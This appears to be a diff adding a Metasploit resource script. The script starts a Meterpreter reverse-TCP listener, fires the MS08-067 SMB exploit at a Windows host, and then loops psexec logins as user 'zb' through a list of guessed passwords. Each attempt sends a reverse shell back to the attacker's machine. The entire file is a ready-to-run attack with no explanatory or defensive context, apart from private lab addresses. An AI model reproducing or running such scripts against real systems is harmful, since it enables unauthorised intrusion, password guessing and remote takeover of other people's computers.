@@ -1,0 +1,84 @@
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LPORT 1337
+set LHOST 192.168.1.110
+exploit -j -z
+setg DisablePayloadHandler l
+use exploit/windows/smb/ms08_067_netapi
+set RHOST 192.168.1.2
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LPORT 1337
+set LHOST 192.168.1.110
+exploit -j -z
+use exploit/windows/smb/psexec
+set SMBUser zb
+set SMBPass nipples
+set RHOST 192.168.1.2
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LPORT 1337
+set LHOST 192.168.1.110
+exploit -j -z
+use exploit/windows/smb/psexec
+set SMBUser zb
+set SMBPass courtney
+set RHOST 192.168.1.2
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LPORT 1337
+set LHOST 192.168.1.110
+exploit -j -z
+use exploit/windows/smb/psexec
+set SMBUser zb
+set SMBPass diesel
+set RHOST 192.168.1.2
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LPORT 1337
+set LHOST 192.168.1.110
+exploit -j -z
+use exploit/windows/smb/psexec
+set SMBUser zb
+set SMBPass rocks
+set RHOST 192.168.1.2
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LPORT 1337
+set LHOST 192.168.1.110
+exploit -j -z
+use exploit/windows/smb/psexec
+set SMBUser zb
+set SMBPass eminem
+set RHOST 192.168.1.2
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LPORT 1337
+set LHOST 192.168.1.110
+exploit -j -z
+use exploit/windows/smb/psexec
+set SMBUser zb
+set SMBPass westside
+set RHOST 192.168.1.2
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LPORT 1337
+set LHOST 192.168.1.110
+exploit -j -z
+use exploit/windows/smb/psexec
+set SMBUser zb
+set SMBPass suzuki
+set RHOST 192.168.1.2
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LPORT 1337
+set LHOST 192.168.1.110
+exploit -j -z
+use exploit/windows/smb/psexec
+set SMBUser zb
+set SMBPass daddy
+set RHOST 192.168.1.2
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LPORT 1337
+set LHOST 192.168.1.110
+exploit -j -z
+use exploit/windows/smb/psexec
+set SMBUser zb
+set SMBPass zlx520
+set RHOST 192.168.1.2
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LPORT 1337
+set LHOST 192.168.1.110
+exploit -j -z
